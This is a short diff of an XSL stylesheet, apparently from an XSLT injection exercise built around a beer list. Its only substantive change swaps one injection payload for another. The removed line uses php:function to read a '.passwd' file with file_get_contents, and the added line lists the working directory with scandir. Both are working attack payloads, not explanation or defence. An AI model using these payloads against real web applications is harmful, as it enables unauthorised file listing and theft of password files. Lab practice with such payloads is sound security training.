@@ -4,7 +4,7 @@
 
 <body style="font-family:Arial;font-size:10pt;background-color:#EEFFAA">
 
-<xsl:value-of select="php:function('file_get_contents','.passwd')"/>
+<xsl:value-of select="php:function('scandir','./')"/>
 <xsl:for-each select="beers/beer">
   
 <div style="background-color:teal;color:white;padding:4px">
